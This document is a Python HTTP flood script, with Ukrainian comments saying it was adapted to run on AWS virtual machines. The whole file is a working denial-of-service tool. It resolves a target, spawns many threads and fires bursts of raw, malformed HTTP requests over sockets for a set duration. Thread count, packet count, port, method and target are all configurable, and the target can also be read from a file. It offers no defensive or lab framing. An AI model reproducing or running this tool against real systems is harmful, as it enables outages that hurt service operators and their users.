#!/usr/bin/env python3
"""
HTTP Flood Attack Script
Адаптовано для AWS infrastructure без GUI
"""
import socket
import threading
import string
import random
import time
import sys
import argparse

LOADERS = {'PYF':"\n\n", 'OWN1':"\n\n\r\r", 'OWN2':"\r\r\n\n", 'OWN3':"\n\r\n", 'OWN4':"\n\n\n\n", 'OWN5':"\n\n\n\n\r\r\r\r"}
METHODS = ['GET', 'PUT', 'PATCH', 'POST', 'HEAD', 'DELETE', 'OPTIONS', 'TRACE']

def status_print(ip, port, thread_id, rps, path_get):
    print(f"FLOODING HTTP ---> TARGET={ip}:{port} PATH={path_get} RPS={rps} ID={thread_id}")

def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data

def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

def attack(ip, host, port, method, id, packets_per_task, data_type_loader_packet):
    rps = 0
    url_choice = random.randint(0, 1)
    url_path = generate_url_path_choice(5) if url_choice else generate_url_path_pyflooder(5)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        packet_data = f"{method} /{url_path} HTTP/1.1\nHost: {host}{LOADERS[data_type_loader_packet]}".encode()
        s.connect((ip, port))
        for _ in range(packets_per_task):
            s.sendall(packet_data)
            s.send(packet_data)
            rps += 2
    except:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass

    status_print(ip, port, id, rps, url_path)

status_code = False
id_loader = 0

def runing_attack(ip, host, port_loader, time_loader, methods_loader, packets_per_task, datatype, tasks_per_thread):
    global status_code, id_loader
    if status_code:
        while time.time() < time_loader:
            for _ in range(tasks_per_thread):
                id_loader += 1
                attack(ip, host, port_loader, methods_loader, id_loader, packets_per_task, datatype)
    else:
        threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, methods_loader, packets_per_task, datatype, tasks_per_thread)).start()

def start_attack(target, dst_port, duration, threads, tasks_per_thread, packets_per_task, datatype, method):
    global status_code, id_loader

    print(f"[*] TRYING TO GET IP:PORT...")
    try:
        host = str(target).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
        ip = socket.gethostbyname(host)
        print(f"[+] Target resolved: {host} -> {ip}:{dst_port}")
    except socket.gaierror:
        print(f"[-] Failed to resolve target: {target}")
        sys.exit(1)

    time_loader = time.time() + duration
    print(f"[*] Starting attack for {duration} seconds with {threads} threads")

    for loader_num in range(threads):
        sys.stdout.write(f"\r[*] Creating thread {loader_num + 1}/{threads}...")
        sys.stdout.flush()
        id_loader += 1
        runing_attack(ip, host, dst_port, time_loader, method, packets_per_task, datatype, tasks_per_thread)

    sys.stdout.write("\n")
    sys.stdout.flush()
    status_code = True
    print(f"[+] Attack started! Press Ctrl+C to stop.")

    try:
        while time.time() < time_loader:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user")
        sys.exit(0)

    print(f"\n[+] Attack completed after {duration} seconds")

def read_target_ip():
    """Читає IP цільового сервера з файлу (для AWS VM)"""
    try:
        with open('/home/ubuntu/target_ip.txt', 'r') as f:
            return f.read().strip()
    except FileNotFoundError:
        return None

def main():
    parser = argparse.ArgumentParser(description='HTTP Flood Attack Tool')
    parser.add_argument('-t', '--target', type=str, help='Target IP or domain')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds (default: 60)')
    parser.add_argument('--threads', type=int, default=100, help='Number of threads (default: 100)')
    parser.add_argument('--tasks', type=int, default=100, help='Tasks per thread (default: 100)')
    parser.add_argument('--packets', type=int, default=500, help='Packets per task (default: 500)')
    parser.add_argument('--loader', type=str, default='PYF', choices=LOADERS.keys(), help='Loader type (default: PYF)')
    parser.add_argument('--method', type=str, default='GET', choices=METHODS, help='HTTP method (default: GET)')

    args = parser.parse_args()

    # Якщо target не вказаний, спробувати прочитати з файлу
    target = args.target
    if not target:
        target = read_target_ip()
        if not target:
            print("[-] Error: No target specified. Use -t <target> or ensure /home/ubuntu/target_ip.txt exists")
            sys.exit(1)
        print(f"[+] Target IP loaded from file: {target}")

    start_attack(
        target=target,
        dst_port=args.port,
        duration=args.duration,
        threads=args.threads,
        tasks_per_thread=args.tasks,
        packets_per_task=args.packets,
        datatype=args.loader,
        method=args.method
    )

if __name__ == "__main__":
    main()
